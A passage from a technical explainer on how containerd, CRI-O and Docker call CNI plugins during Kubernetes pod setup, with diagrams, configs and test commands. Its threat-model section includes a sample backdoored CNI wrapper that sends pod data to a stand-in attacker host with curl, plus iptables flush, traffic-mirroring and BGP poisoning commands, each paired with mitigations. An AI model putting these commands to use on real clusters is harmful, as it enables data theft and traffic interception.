            "CNI_NETNS=" + netns,
            // ...
        }
        
        cmd := exec.Command(pluginPath)
        cmd.Env = env
        cmd.Stdin = bytes.NewReader(configJSON)
        cmd.Run()  // Errors often ignored on teardown
    }
}
```

**Key Points**:
1. containerd does **NOT** link against CNI as a library
2. containerd **shells out** to CNI binaries (fork + exec)
3. Communication is via **stdin/stdout + environment variables**
4. CNI binary is a **short-lived process** (not a daemon)
5. Each network setup involves **multiple process forks** (one per plugin in chain)

---

## Detailed Sequence: Pod Creation with Networking

```
┌────────────────────────────────────────────────────────────────┐
│  T=0s: User creates pod                                        │
└────────────────────────────────────────────────────────────────┘

$ kubectl run nginx --image=nginx
                    │
                    ▼
┌────────────────────────────────────────────────────────────────┐
│  T=1s: API server persists pod, scheduler assigns to node-1   │
└────────────────────────────────────────────────────────────────┘
                    │
                    ▼
┌────────────────────────────────────────────────────────────────┐
│  T=2s: Kubelet on node-1 detects new pod                      │
└────────────────────────────────────────────────────────────────┘

Kubelet watches API: GET /api/v1/pods?fieldSelector=spec.nodeName=node-1
Sees new pod: nginx-abc
                    │
                    ▼
┌────────────────────────────────────────────────────────────────┐
│  T=3s: Kubelet → CRI gRPC → containerd                        │
└────────────────────────────────────────────────────────────────┘

Kubelet makes gRPC call:

RunPodSandbox(RunPodSandboxRequest{
  config: PodSandboxConfig{
    metadata: {name: "nginx-abc", namespace: "default"},
    hostname: "nginx-abc",
    log_directory: "/var/log/pods/...",
    dns_config: {
      servers: ["10.96.0.10"],
      searches: ["default.svc.cluster.local"],
    },
    port_mappings: [],
  }
})
                    │
                    ▼
┌────────────────────────────────────────────────────────────────┐
│  T=4s: containerd creates pause container                     │
└────────────────────────────────────────────────────────────────┘

containerd → runc:

1. Create network namespace
   $ ip netns add cni-12345678-9abc-def0
   Namespace created: /var/run/netns/cni-12345678-9abc-def0

2. Start pause container in this netns
   $ runc create --pid-file /run/containerd/io.containerd.runtime.v2.task/.../init.pid \
                 --bundle /run/containerd/.../bundle
   
   Pause container now holds the network namespace
   (Just sleeps forever: pause())
                    │
                    ▼
┌────────────────────────────────────────────────────────────────┐
│  T=5s: containerd calls CNI plugins                            │
└────────────────────────────────────────────────────────────────┘

containerd reads: /etc/cni/net.d/10-calico.conflist

{
  "cniVersion": "0.3.1",
  "name": "k8s-pod-network",
  "plugins": [
    {"type": "calico", ...},
    {"type": "bandwidth", ...},
    {"type": "portmap", ...}
  ]
}

For EACH plugin in the list:

┌────────────────────────────────────────────────────────────────┐
│  T=6s: containerd execs CNI plugin #1 (calico)                │
└────────────────────────────────────────────────────────────────┘

Fork + exec:
$ /opt/cni/bin/calico

Environment variables:
CNI_COMMAND=ADD
CNI_CONTAINERID=abc123def456
CNI_NETNS=/var/run/netns/cni-12345678-9abc-def0
CNI_IFNAME=eth0
CNI_PATH=/opt/cni/bin

Stdin (JSON):
{
  "cniVersion": "0.3.1",
  "name": "k8s-pod-network",
  "type": "calico",
  "log_level": "info",
  "datastore_type": "kubernetes",
  "nodename": "node-1",
  "mtu": 1440,
  "ipam": {
    "type": "calico-ipam",
    "assign_ipv4": "true"
  },
  "policy": {"type": "k8s"},
  "kubernetes": {
    "kubeconfig": "/etc/cni/net.d/calico-kubeconfig"
  }
}

┌────────────────────────────────────────────────────────────────┐
│  T=7s: Calico CNI binary executes                             │
└────────────────────────────────────────────────────────────────┘

Calico binary (Go program) runs:

1. Parse stdin JSON
2. Determine node name from env or config
3. Call IPAM plugin to allocate IP:
   
   $ /opt/cni/bin/calico-ipam
   Stdin: {"type": "calico-ipam", ...}
   
   IPAM plugin:
   - Queries Kubernetes API for available IPs
   - Allocates 10.244.1.5 from node-1's block
   - Creates IPAMBlock CRD in Kubernetes
   - Returns: {"ips": [{"address": "10.244.1.5/32"}]}

4. Create veth pair:
   $ ip link add veth_host type veth peer name veth_container
   
   Host side: veth_host (will be renamed to cali1234567890)
   Container side: veth_container (will become eth0 in pod)

5. Move container side into netns:
   $ ip link set veth_container netns /var/run/netns/cni-12345678-9abc-def0

6. Enter netns and configure container interface:
   $ nsenter --net=/var/run/netns/cni-12345678-9abc-def0 bash
   $ ip link set veth_container name eth0
   $ ip addr add 10.244.1.5/32 dev eth0
   $ ip link set eth0 up
   $ ip route add 169.254.1.1 dev eth0 scope link
   $ ip route add default via 169.254.1.1 dev eth0

7. Configure host side:
   $ ip link set veth_host name cali1234567890
   $ ip link set cali1234567890 up
   $ ip route add 10.244.1.5 dev cali1234567890 scope link

8. Program iptables rules (if NetworkPolicy exists):
   $ iptables -t filter -N cali-fw-cali1234567890
   $ iptables -t filter -A cali-fw-cali1234567890 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
   $ iptables -t filter -A cali-fw-cali1234567890 -j DROP  # Default deny
   $ iptables -t filter -I FORWARD -o cali1234567890 -j cali-fw-cali1234567890

9. Write result to stdout (JSON):
   {
     "cniVersion": "0.3.1",
     "interfaces": [
       {
         "name": "cali1234567890",
         "mac": "ee:ee:ee:ee:ee:ee"
       },
       {
         "name": "eth0",
         "mac": "aa:bb:cc:dd:ee:ff",
         "sandbox": "/var/run/netns/cni-12345678-9abc-def0"
       }
     ],
     "ips": [
       {
         "version": "4",
         "interface": 1,
         "address": "10.244.1.5/32",
         "gateway": "169.254.1.1"
       }
     ],
     "routes": [
       {"dst": "0.0.0.0/0", "gw": "169.254.1.1"}
     ],
     "dns": {}
   }

10. Exit (process terminates)

┌────────────────────────────────────────────────────────────────┐
│  T=8s: containerd reads stdout from calico binary             │
└────────────────────────────────────────────────────────────────┘

containerd parses result JSON
Stores network info internally
                    │
                    ▼
┌────────────────────────────────────────────────────────────────┐
│  T=9s: containerd execs CNI plugin #2 (bandwidth)             │
└────────────────────────────────────────────────────────────────┘

$ /opt/cni/bin/bandwidth
CNI_COMMAND=ADD
Stdin: {"type": "bandwidth", "ingressRate": 1000000, ...}

Bandwidth plugin:
- Receives previous result (from calico) on stdin
- Configures tc qdisc for rate limiting:
  $ tc qdisc add dev cali1234567890 root handle 1: htb default 30
  $ tc class add dev cali1234567890 parent 1: classid 1:30 htb rate 1000kbit
- Returns augmented result on stdout
- Exits

┌────────────────────────────────────────────────────────────────┐
│  T=10s: containerd execs CNI plugin #3 (portmap)              │
└────────────────────────────────────────────────────────────────┘

$ /opt/cni/bin/portmap
CNI_COMMAND=ADD
Stdin: {"type": "portmap", "capabilities": {"portMappings": true}, ...}

Portmap plugin:
- Configures iptables DNAT rules for hostPort
- (Not used if pod has no hostPort)
- Returns result
- Exits

┌────────────────────────────────────────────────────────────────┐
│  T=11s: containerd returns success to kubelet                 │
└────────────────────────────────────────────────────────────────┘

gRPC response:
RunPodSandboxResponse{
  pod_sandbox_id: "abc123def456"
}
                    │
                    ▼
┌────────────────────────────────────────────────────────────────┐
│  T=12s: Kubelet creates application containers                │
└────────────────────────────────────────────────────────────────┘

Kubelet → containerd: CreateContainer(nginx)
containerd → runc: create container with network mode = container:pause

Container joins pause's network namespace:
- Shares same network namespace
- Sees same eth0 interface (10.244.1.5)
- Shares same routing table
- No additional CNI calls needed

┌────────────────────────────────────────────────────────────────┐
│  T=15s: Pod running, network operational                      │
└────────────────────────────────────────────────────────────────┘

Pod containers can now:
✅ Bind to ports (nginx listens on :80)
✅ Connect to other pods (10.244.x.x)
✅ Resolve DNS (10.96.0.10)
✅ Access services (10.96.x.x ClusterIP)
✅ Egress to internet (if allowed)

Meanwhile, in parallel:

┌────────────────────────────────────────────────────────────────┐
│  calico-node DaemonSet (long-running daemon)                  │
└────────────────────────────────────────────────────────────────┘

calico-node pod watches Kubernetes API:
1. Detects new pod: nginx-abc with IP 10.244.1.5
2. Programs BGP routes:
   - Advertises 10.244.1.0/24 to other nodes via BGP
   - Other nodes learn: "to reach 10.244.1.x, go via node-1"
3. Updates BIRD config (BGP daemon)
4. Monitors for NetworkPolicy changes
5. If NetworkPolicy created, updates iptables rules

This daemon is SEPARATE from CNI binary execution!
```

---

## Different Runtime Approaches

### 1. containerd (Modern, CRI-native)

```
┌─────────────────────────────────────────────────────────────────┐
│  CONTAINERD CNI ARCHITECTURE                                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  containerd binary                                              │
│  ├── CRI plugin (gRPC server)                                   │
│  │   └── Network service                                        │
│  │       ├── Reads /etc/cni/net.d/*.conflist                   │
│  │       ├── Calls CNI library (go-cni)                         │
│  │       └── go-cni → execs /opt/cni/bin/*                     │
│  │                                                              │
│  └── Container lifecycle                                        │
│      └── runc (for namespace creation)                          │
│                                                                 │
│  File locations:                                                │
│  • /etc/cni/net.d/10-calico.conflist  (CNI config)             │
│  • /opt/cni/bin/calico                (CNI binary)             │
│  • /var/lib/cni/networks/             (IPAM state)             │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Verification**:
```bash
# Check containerd CNI config
sudo crictl info | jq -r '.config.cni'
# {
#   "binDir": "/opt/cni/bin",
#   "confDir": "/etc/cni/net.d"
# }

# Trace CNI execution
sudo strace -f -e trace=execve containerd 2>&1 | grep cni
# execve("/opt/cni/bin/calico", ["calico"], ["CNI_COMMAND=ADD", ...])
```

### 2. CRI-O (Kubernetes-focused)

```
┌─────────────────────────────────────────────────────────────────┐
│  CRI-O CNI ARCHITECTURE                                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  cri-o binary                                                   │
│  ├── CRI gRPC server                                            │
│  │   └── Network manager                                        │
│  │       ├── CNI library integration                            │
│  │       └── Plugin execution                                   │
│  │                                                              │
│  └── OCI runtime (runc/crun)                                    │
│                                                                 │
│  Config: /etc/crio/crio.conf                                    │
│  [crio.network]                                                 │
│  network_dir = "/etc/cni/net.d/"                                │
│  plugin_dirs = ["/opt/cni/bin/"]                                │
│                                                                 │
│  Very similar to containerd, uses same CNI standard             │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 3. Docker (Legacy, Non-CNI by Default)

```
┌─────────────────────────────────────────────────────────────────┐
│  DOCKER NETWORKING (Without dockershim)                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Docker uses libnetwork (NOT CNI):                              │
│  • Built-in network drivers: bridge, host, overlay, macvlan    │
│  • Own IPAM (not CNI IPAM)                                     │
│  • Own network namespace management                             │
│  • Creates docker0 bridge by default                            │
│                                                                 │
│  To use CNI with Docker:                                        │
│  1. Install dockershim (deprecated, removed in K8s 1.24)        │
│  2. Configure Docker to use "none" network driver               │
│  3. Let kubelet/dockershim call CNI                             │
│                                                                 │
│  This is why Docker is deprecated in Kubernetes!                │
│  • Docker doesn't implement CRI natively                        │
│  • Requires translation layer (dockershim)                      │
│  • Adds complexity and maintenance burden                       │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Docker network model** (when NOT using CNI):
```bash
# Docker creates its own bridge
docker network ls
# NETWORK ID     NAME      DRIVER    SCOPE
# abc123def456   bridge    bridge    local
# def789ghi012   host      host      local
# ghi345jkl678   none      null      local

ip addr show docker0
# docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
#     inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0

# Containers get IPs from docker0 subnet
docker run -d --name test nginx
docker inspect test | jq -r '.[0].NetworkSettings.IPAddress'
# 172.17.0.2

# Docker manages its own iptables rules
sudo iptables-save | grep docker
# -A FORWARD -o docker0 -j DOCKER
# -A FORWARD -o docker0 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
```

---

## Control Plane vs Data Plane: Network Management

### Control Plane (Desired State)

```
┌─────────────────────────────────────────────────────────────────┐
│  NETWORK CONTROL PLANE COMPONENTS                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. Kubernetes API Server                                       │
│     ┌──────────────────────────────────────────────────────┐   │
│     │  Stores resource definitions:                        │   │
│     │  • Pod: {spec: {containers: [...], nodeSelector}}    │   │
│     │  • Service: {spec: {type: ClusterIP, ports: [...]}}  │   │
│     │  • NetworkPolicy: {spec: {podSelector, ingress}}     │   │
│     │  • Endpoints: {subsets: [{addresses, ports}]}        │   │
│     └──────────────────────────────────────────────────────┘   │
│                                                                 │
│  2. CNI Controller (e.g., calico-kube-controllers)              │
│     ┌──────────────────────────────────────────────────────┐   │
│     │  Watches Kubernetes API:                             │   │
│     │  • Pod created → Create IPPool allocation           │   │
│     │  • NetworkPolicy created → Create CRD               │   │
│     │  • Node added → Allocate pod CIDR block             │   │
│     │                                                      │   │
│     │  Translates K8s resources to CNI-specific CRDs:     │   │
│     │  • NetworkPolicy → GlobalNetworkPolicy (Calico)     │   │
│     │  • Pod → IPAMBlock (IP allocation record)           │   │
│     └──────────────────────────────────────────────────────┘   │
│                                                                 │
│  3. Scheduler (indirect network control)                        │
│     ┌──────────────────────────────────────────────────────┐   │
│     │  • Pod placement affects network topology            │   │
│     │  • Affinity rules can enforce network locality       │   │
│     │  • Node selection impacts cross-node traffic         │   │
│     └──────────────────────────────────────────────────────┘   │
│                                                                 │
│  Control plane NEVER touches data plane directly!               │
│  • No direct iptables manipulation                              │
│  • No direct route programming                                  │
│  • No direct packet forwarding                                  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Data Plane (Actual Packet Forwarding)

```
┌─────────────────────────────────────────────────────────────────┐
│  NETWORK DATA PLANE COMPONENTS (EVERY NODE)                     │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. CNI Binary Execution (pod lifecycle events)                 │
│     ┌──────────────────────────────────────────────────────┐   │
│     │  Triggered by: container runtime during pod create/del│  │
│     │  • Allocates pod IP                                   │   │
│     │  • Creates veth pair                                  │   │
│     │  • Configures pod interface                           │   │
│     │  • Sets up initial routes                             │   │
│     │  Short-lived: runs and exits                          │   │
│     └──────────────────────────────────────────────────────┘   │
│                                                                 │
│  2. CNI Daemon (long-running, e.g., calico-node)                │
│     ┌──────────────────────────────────────────────────────┐   │
│     │  Continuously runs on every node:                    │   │
│     │  • Programs routing tables (BGP, static routes)      │   │
│     │  • Manages VXLAN/IPIP tunnels                        │   │
│     │  • Enforces NetworkPolicy (iptables/eBPF)            │   │
│     │  • Monitors network health                           │   │
│     │  • Syncs with control plane via API                  │   │
│     └──────────────────────────────────────────────────────┘   │
│                                                                 │
│  3. Kernel Networking Stack                                     │
│     ┌──────────────────────────────────────────────────────┐   │
│     │  Actual packet processing:                           │   │
│     │  • IP routing (kernel routing table)                 │   │
│     │  • iptables/nftables (netfilter)                     │   │
│     │  • eBPF programs (XDP, tc)                           │   │
│     │  • Network namespaces                                │   │
│     │  • Bridge/VXLAN/tunnel devices                       │   │
│     └──────────────────────────────────────────────────────┘   │
│                                                                 │
│  4. kube-proxy (Service implementation)                         │
│     ┌──────────────────────────────────────────────────────┐   │
│     │  Watches Service/Endpoint changes:                   │   │
│     │  • Programs iptables/ipvs rules                      │   │
│     │  • Implements ClusterIP load balancing               │   │
│     │  • Handles NodePort, LoadBalancer                    │   │
│     │  • DNAT for service traffic                          │   │
│     └──────────────────────────────────────────────────────┘   │
│                                                                 │
│  Data plane handles EVERY packet:                               │
│  • Pod-to-pod communication                                     │
│  • Pod-to-service communication                                 │
│  • Ingress from external clients                                │
│  • Egress to internet                                           │
│  • NetworkPolicy enforcement (drop/allow)                       │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Example: NetworkPolicy Lifecycle

**Control Plane**:
```yaml
# User creates NetworkPolicy
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all
  namespace: default
spec:
  podSelector:
    matchLabels:
      app: web
  policyTypes:
  - Ingress
  ingress: []  # Empty = deny all
```

**Control Plane Processing**:
```
1. API Server:
   • Validates NetworkPolicy schema
   • Persists to etcd
   • Sends watch event to subscribers

2. calico-kube-controllers (control plane):
   • Watches NetworkPolicy objects
   • Translates to Calico GlobalNetworkPolicy CRD
   • Creates/updates GlobalNetworkPolicy in etcd
   • Does NOT program iptables itself
```

**Data Plane Processing**:
```
3. calico-node DaemonSet (data plane, on worker-1):
   • Watches GlobalNetworkPolicy CRD
   • Finds pods matching selector (app=web) on this node
   • For each matching pod:
     a. Find veth interface (cali1234567890)
     b. Program iptables:
        
        # Create chain for this interface
        iptables -t filter -N cali-fw-cali1234567890
        
        # Default deny ingress
        iptables -t filter -A cali-fw-cali1234567890 -j DROP
        
        # Allow established connections
        iptables -t filter -I cali-fw-cali1234567890 -m conntrack \
          --ctstate RELATED,ESTABLISHED -j ACCEPT
        
        # Jump to this chain for traffic to pod
        iptables -t filter -I FORWARD -o cali1234567890 \
          -j cali-fw-cali1234567890

4. Kernel (data plane):
   • Incoming packets to pod hit FORWARD chain
   • Jump to cali-fw-cali1234567890
   • If not ESTABLISHED, hit DROP rule
   • Packet dropped, never reaches pod
```

**Packet-level view**:
```
Client tries to connect to web pod (10.244.1.5:80):

Packet arrives at node-1:
┌────────────────────────────────────────┐
│ IP: 10.244.2.10 → 10.244.1.5          │
│ TCP: 54321 → 80 (SYN)                 │
└────────────────────────────────────────┘
                │
                ▼ Routing table
         to 10.244.1.5 dev cali1234567890
                │
                ▼ iptables FORWARD chain
         -j cali-fw-cali1234567890
                │
                ▼ cali-fw-cali1234567890 chain
         -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
         (doesn't match, NEW connection)
                │
                ▼ Next rule
         -j DROP
                │
                ▼
         ❌ PACKET DROPPED
         
Pod never receives packet, connection times out
```

---

## Runtime-Specific Implementation Details

### containerd CNI Integration

```bash
# Check containerd CNI configuration
cat /etc/containerd/config.toml
```

```toml
version = 2

[plugins."io.containerd.grpc.v1.cri".cni]
  # Path to CNI config files
  conf_dir = "/etc/cni/net.d"
  
  # Path to CNI binary plugins
  bin_dir = "/opt/cni/bin"
  
  # Maximum config file size
  conf_template = ""
  
  # Maximum number of concurrent CNI operations
  max_conf_num = 1
```

**containerd CNI workflow**:
```go
// Simplified from containerd source

// Load CNI configs on startup
func (c *cniNetworkPlugin) syncNetworkConfig() error {
    files, _ := os.ReadDir(c.confDir)
    for _, file := range files {
        if strings.HasSuffix(file.Name(), ".conf") || 
           strings.HasSuffix(file.Name(), ".conflist") {
            c.configs = append(c.configs, loadConfig(file))
        }
    }
    // Configs are sorted by filename
    sort.Strings(c.configs)
}

// Called by CRI when creating pod
func (c *cniNetworkPlugin) SetUpPod(namespace, name, id string, netns string) error {
    // Build CNI runtime config
    rt := &libcni.RuntimeConf{
        ContainerID: id,
        NetNS:       netns,
        IfName:      "eth0",
        Args: [][2]string{
            {"IgnoreUnknown", "1"},
            {"K8S_POD_NAMESPACE", namespace},
            {"K8S_POD_NAME", name},
            {"K8S_POD_INFRA_CONTAINER_ID", id},
        },
    }
    
    // Execute CNI plugins
    for _, network := range c.configs {
        // This calls out to binary
        result, err := c.cni.AddNetworkList(network, rt)
        if err != nil {
            // Rollback previous plugins
            c.cni.DelNetworkList(network, rt)
            return err
        }
    }
    return nil
}
```

### CRI-O CNI Integration

```bash
# Check CRI-O CNI configuration
cat /etc/crio/crio.conf
```

```toml
[crio.network]
# Path to CNI configuration files
network_dir = "/etc/cni/net.d/"

# Paths to directories where CNI plugin binaries are located
plugin_dirs = [
  "/opt/cni/bin/",
  "/usr/libexec/cni/",
]

# Default CNI network name
cni_default_network = ""

# Manage network namespace lifecycle
manage_ns_lifecycle = true
```

**CRI-O specific features**:
- More Kubernetes-aware than generic containerd
- Better pod lifecycle management
- Native support for pod network metrics

---

## Security Boundaries and Attack Surfaces

```
┌─────────────────────────────────────────────────────────────────┐
│  COMPONENT COMPROMISE SCENARIOS                                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  SCENARIO 1: Container Runtime Compromised                      │
│  ────────────────────────────────────────────────────────────   │
│  Attacker gains control of containerd/CRI-O process             │
│                                                                 │
│  Direct capabilities:                                           │
│  ✅ Create arbitrary containers                                 │
│  ✅ Call CNI binaries (can inject malicious CNI commands)       │
│  ✅ Read CNI config files                                       │
│  ✅ Access all container filesystems                            │
│                                                                 │
│  Does NOT directly give:                                        │
│  ❌ Root on host (unless runtime runs as root AND escapes)      │
│  ❌ Direct network manipulation (must go through CNI)           │
│  ❌ Access to other nodes                                       │
│                                                                 │
│  Attack vector: Malicious CNI execution                         │
│    1. Runtime calls CNI with CNI_COMMAND=ADD                    │
│    2. Attacker intercepts, passes malicious config:             │
│       {"type": "malicious-cni", "backdoor": "yes"}              │
│    3. If /opt/cni/bin/malicious-cni exists, it executes         │
│                                                                 │
│  Mitigation:                                                    │
│    • Run runtime as non-root (rootless containerd/CRI-O)        │
│    • Read-only /opt/cni/bin mount                               │
│    • Seccomp profile restricting exec syscalls                  │
│    • Audit all CNI executions (auditd)                          │
│                                                                 │
├─────────────────────────────────────────────────────────────────┤
│  SCENARIO 2: CNI Binary Replaced                                │
│  ────────────────────────────────────────────────────────────   │
│  Attacker replaces /opt/cni/bin/calico with backdoor            │
│                                                                 │
│  Impact:                                                        │
│  ✅ Every new pod creation executes malicious code              │
│  ✅ Can steal pod secrets, inject sidecars, modify networking   │
│  ✅ Persistent backdoor (survives runtime restart)              │
│                                                                 │
│  Example malicious CNI:                                         │
│    #!/bin/bash                                                  │
│    # Call original CNI                                          │
│    /opt/cni/bin/calico.orig "$@"                                │
│                                                                 │
│    # Exfiltrate pod info                                        │
│    curl https://attacker.com?pod=$CNI_CONTAINERID \             │
│         -d "$(cat /dev/stdin)"                                  │
│                                                                 │
│  Mitigation:                                                    │
│    • File integrity monitoring (AIDE, Falco)                    │
│    • Signed CNI binaries (Sigstore)                             │
│    • Read-only root filesystem for CNI DaemonSet                │
│    • Immutable infrastructure (no in-place updates)             │
│                                                                 │
├─────────────────────────────────────────────────────────────────┤
│  SCENARIO 3: CNI Daemon Compromised                             │
│  ────────────────────────────────────────────────────────────   │
│  Attacker gains shell in calico-node DaemonSet pod              │
│                                                                 │
│  Direct capabilities:                                           │
│  ✅ Privileged container with host network/PID                  │
│  ✅ Can modify iptables rules                                   │
│  ✅ Can poison BGP routes                                       │
│  ✅ Can sniff all node traffic                                  │
│  ✅ Can access kubelet API (localhost:10250)                    │
│                                                                 │
│  Attack examples:                                               │
│    1. Disable NetworkPolicy:                                    │
│       iptables -F  # Flush all rules                            │
│                                                                 │
│    2. Traffic interception:                                     │
│       iptables -t mangle -I PREROUTING -j TEE \                 │
│         --gateway attacker-ip                                   │
│                                                                 │
│    3. BGP route poisoning (Calico BGP mode):                    │
│       birdc configure  # Load malicious BIRD config             │
│       # Advertise 0.0.0.0/0 via this node (blackhole)           │
│                                                                 │
│  Mitigation:                                                    │
│    • Minimal RBAC for CNI service account                       │
│    • Admission webhook to prevent CNI DaemonSet modification    │
│    • Network segmentation for CNI pods (NetworkPolicy)          │
│    • Falco rules for unexpected iptables/route modifications    │
│    • Use eBPF-based CNI (Cilium) - harder to tamper with        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## Testing & Validation

```bash
# 1. Verify runtime → CNI integration
# Check CNI config loaded by containerd
sudo crictl info | jq '.config.cni'

# Check CNI binary availability
ls -lh /opt/cni/bin/

# Test CNI manually (simulate runtime)
sudo CNI_COMMAND=ADD \
  CNI_CONTAINERID=test-123 \
  CNI_NETNS=/var/run/netns/test-ns \
  CNI_IFNAME=eth0 \
  CNI_PATH=/opt/cni/bin \
  /opt/cni/bin/bridge <<EOF
{
  "cniVersion": "0.3.1",
  "name": "test-network",
  "type": "bridge",
  "bridge": "test-br0",
  "ipam": {
    "type": "host-local",
    "subnet": "10.22.0.0/16"
  }
}
EOF

# Should output JSON result with allocated IP

# 2. Trace CNI execution during pod creation
# Terminal 1: Watch CNI binary executions
sudo strace -f -e trace=execve -p $(pgrep -f "containerd$") 2>&1 | grep "/opt/cni/bin"

# Terminal 2: Create pod
kubectl run test-trace --image=nginx

# Terminal 1 output:
# execve("/opt/cni/bin/calico", ["calico"], ["CNI_COMMAND=ADD", ...])
# execve("/opt/cni/bin/calico-ipam", ["calico-ipam"], [...])
# execve("/opt/cni/bin/bandwidth", ["bandwidth"], [...])

# 3. Verify CNI result
kubectl get pod test-trace -o jsonpath='{.status.podIP}'
# 10.244.1.5

# Find veth pair on host
POD_UID=$(kubectl get pod test-trace -o jsonpath='{.metadata.uid}')
ip link | grep cali
# cali1234567890@if4: <BROADCAST,MULTICAST,UP>

# Verify routing
ip route | grep 10.244.1.5
# 10.244.1.5 dev cali1234567890 scope link

# 4. Test CNI failure handling
# Corrupt CNI binary
sudo chmod -x /opt/cni/bin/calico

# Try to create pod
kubectl run test-fail --image=nginx

kubectl describe pod test-fail | grep -A 5 Events
# Failed to create pod sandbox: failed to setup network: plugin calico failed: permission denied

# Fix CNI binary
sudo chmod +x /opt/cni/bin/calico

# Pod should eventually start after kubelet retry

# 5. Test NetworkPolicy enforcement in data plane
kubectl run web --image=nginx --labels=app=web --port=80
kubectl expose pod web --port=80

# Verify connectivity (no policy)
kubectl run client --image=busybox --rm -it -- wget -O- http://web --timeout=5
# Should succeed

# Apply NetworkPolicy (control plane)
cat <<EOF | kubectl apply -f -
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all
spec:
  podSelector:
    matchLabels:
      app: web
  policyTypes:
  - Ingress
EOF

# Wait for data plane to sync (watch iptables)
watch -n 1 'sudo iptables-save | grep -A 10 cali-fw'

# Test connectivity (should fail now)
kubectl run client --image=busybox --rm -it -- wget -O- http://web --timeout=5
# wget: download timed out

# Verify in data plane
WEB_POD_IP=$(kubectl get pod web -o jsonpath='{.status.podIP}')
sudo iptables-save | grep -A 20 "cali-fw" | grep DROP
# -A cali-fw-cali1234567890 -m comment --comment "Drop if no policies matched" -j DROP

# 6. Benchmark CNI overhead
# Measure pod creation time WITH CNI
time (kubectl run perf-test --image=nginx --restart=Never && \
      kubectl wait --for=condition=Ready pod/perf-test --timeout=30s)
# real    0m5.234s  (includes CNI setup)

# Delete pod
kubectl delete pod perf-test

# Measure with hostNetwork (NO CNI)
time (kubectl run perf-test-host --image=nginx --restart=Never \
      --overrides='{"spec":{"hostNetwork":true}}' && \
      kubectl wait --for=condition=Ready pod/perf-test-host --timeout=30s)
# real    0m3.112s  (no CNI setup)

# CNI adds ~2 seconds to pod startup

# 7. Test CNI plugin chaining
# Create config with multiple plugins
cat <<EOF | sudo tee /etc/cni/net.d/20-test-chain.conflist
{
  "cniVersion": "0.3.1",
  "name": "test-chain",
  "plugins": [
    {
      "type": "bridge",
      "bridge": "test-br0",
      "ipam": {"type": "host-local", "subnet": "10.33.0.0/16"}
    },
    {
      "type": "bandwidth",
      "ingressRate": 1000000,
      "egressRate": 1000000
    },
    {
      "type": "portmap",
      "capabilities": {"portMappings": true}
    }
  ]
}
EOF

# All three plugins will be executed in sequence
# Each receives previous plugin's output as input

# 8. Monitor CNI daemon activity
# Watch calico-node logs
kubectl logs -n kube-system -l k8s-app=calico-node -f | grep -i "policy\|route"

# Create NetworkPolicy
kubectl apply -f networkpolicy.yaml

# See logs:
# Updating policy for pod default/web
# Programming iptables rules for cali1234567890

# 9. Test CNI IPAM state
# For Calico
kubectl get ippool -o yaml
# Shows allocated IP ranges per node

kubectl get ipamblock -o yaml
# Shows individual IP allocations

# For other CNIs (host-local IPAM)
sudo cat /var/lib/cni/networks/k8s-pod-network/10.244.1.5
# Should show container ID that owns this IP

# 10. Verify CNI cleanup on pod deletion
POD_IP=$(kubectl get pod test-trace -o jsonpath='{.status.podIP}')
VETH=$(ip link | grep cali | head -1 | cut -d: -f2 | xargs)

# Verify route exists
ip route | grep $POD_IP
# 10.244.1.5 dev cali1234567890 scope link

# Delete pod
kubectl delete pod test-trace

# Wait a few seconds
sleep 5

# Verify cleanup
ip route | grep $POD_IP
# (no output - route removed)

ip link show $VETH
# Device "cali1234567890" does not exist (cleaned up)

# IPAM state cleaned
kubectl get ipamblock -o yaml | grep $POD_IP
# (no output - IP released)
```

---

## Performance Characteristics

| **Operation** | **Latency** | **Bottleneck** |
|--------------|-----------|--------------|
| **CNI plugin execution** | 50-200ms | fork/exec overhead, IPAM API calls |
| **veth pair creation** | 1-5ms | Kernel syscalls (netlink) |
| **IP allocation (Kubernetes API)** | 10-50ms | API server round trip |
| **IP allocation (local)** | <1ms | File I/O (/var/lib/cni) |
| **iptables rule programming** | 10-100ms | Rule count (linear scan), kernel lock contention |
| **eBPF program load** | 5-20ms | Verification, JIT compilation |
| **BGP route propagation** | 100ms-1s | BGP convergence time |
| **VXLAN encapsulation** | 50-100µs | Per-packet overhead |

**Optimization strategies**:
1. **Use IPAM with local cache** (reduce API calls)
2. **Batch iptables updates** (iptables-restore vs individual rules)
3. **Use eBPF instead of iptables** (Cilium: 10x faster policy enforcement)
4. **Pre-pull CNI plugin images** (reduce init time)
5. **Use ipvs mode in kube-proxy** (better than iptables for >1000 services)

---

## Next 3 Steps

1. **Build minimal CNI plugin from scratch**: Implement CNI plugin in Go that handles ADD/DEL/CHECK/VERSION commands. Create veth pairs, assign IPs from static pool (no IPAM service), configure basic routing. Test with containerd directly (no Kubernetes), verify namespace isolation, measure execution time. Add logging, error handling, idempotency (handle duplicate ADD calls).
   ```bash
   # Test directly with containerd
   ctr run --rm --net-conf /path/to/cni-config.json test-image test-container
   ```

2. **Analyze CNI execution with eBPF tracing**: Use bpftrace to trace CNI binary executions, measure latency breakdown (fork, exec, netlink calls, IPAM). Identify hot paths, compare different CNI plugins (Calico vs Cilium vs Flannel). Trace NetworkPolicy enforcement (iptables rule insertion vs eBPF program load). Build performance profile showing where time is spent during pod creation.
   ```bash
   # Trace CNI executions
